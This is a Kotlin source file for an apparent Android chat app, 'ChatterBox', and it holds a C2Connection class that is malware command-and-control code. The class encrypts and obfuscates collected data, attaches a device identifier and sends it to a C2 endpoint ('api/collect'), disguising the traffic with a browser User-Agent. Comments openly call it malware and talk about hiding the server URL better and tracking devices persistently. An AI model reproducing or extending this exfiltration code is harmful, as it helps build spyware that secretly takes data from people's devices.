package com.example.ChatterBox.services

import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import java.security.MessageDigest

class C2Connection {
    private val TAG = "C2Connection"
    
    // Obfuscated C2 server URL - this would be more cleverly hidden in a real scenario
    private val serverDomain = "example.com" 
    private val serverPath = "api/collect"
    private val serverProtocol = "https"
    
    // Encryption key
    private val encryptionKey = "c7f31783b7184d1892a5a30b24d28929"
    
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    
    // Get the real C2 server URL through obfuscation
    private fun getC2ServerUrl(): String {
        return "$serverProtocol://$serverDomain/$serverPath"
    }
    
    // Encrypt data before sending
    private fun encryptData(data: String): String {
        try {
            // Create an encryption key from our secret key
            val md = MessageDigest.getInstance("SHA-256")
            val key = md.digest(encryptionKey.toByteArray()).copyOf(16)
            val secretKey = SecretKeySpec(key, "AES")
            
            // Encrypt the data
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)
            val encryptedBytes = cipher.doFinal(data.toByteArray())
            
            // Return base64 encoded string
            return Base64.encodeToString(encryptedBytes, Base64.DEFAULT)
        } catch (e: Exception) {
            Log.e(TAG, "Encryption error: ${e.message}")
            // Return simple base64 encoding if encryption fails
            return Base64.encodeToString(data.toByteArray(), Base64.DEFAULT)
        }
    }
    
    // Additional layer of obfuscation
    private fun obfuscateData(data: String): String {
        // Simple obfuscation technique
        val obfuscated = data.reversed()
        return Base64.encodeToString(obfuscated.toByteArray(), Base64.DEFAULT)
    }
    
    // Send data to C2 server
    suspend fun sendData(type: String, data: String): Boolean {
        return try {
            withContext(Dispatchers.IO) {
                val jsonData = JSONObject().apply {
                    put("type", type)
                    put("data", encryptData(data))
                    put("timestamp", System.currentTimeMillis())
                    put("device_id", getDeviceIdentifier())
                }
                
                // Final obfuscation layer
                val finalData = obfuscateData(jsonData.toString())
                
                val requestBody = RequestBody.create(
                    "application/octet-stream".toMediaTypeOrNull(),
                    finalData
                )
                
                val request = Request.Builder()
                    .url(getC2ServerUrl())
                    .post(requestBody)
                    .header("Content-Type", "application/octet-stream")
                    .header("User-Agent", "Mozilla/5.0") // Disguise as regular browser traffic
                    .build()
                
                httpClient.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending data to C2: ${e.message}")
            false
        }
    }
    
    // Generate a unique device identifier that persists across app reinstalls
    private fun getDeviceIdentifier(): String {
        // In a real malware, this would use more persistent methods
        return "device_id_placeholder"
    }
}
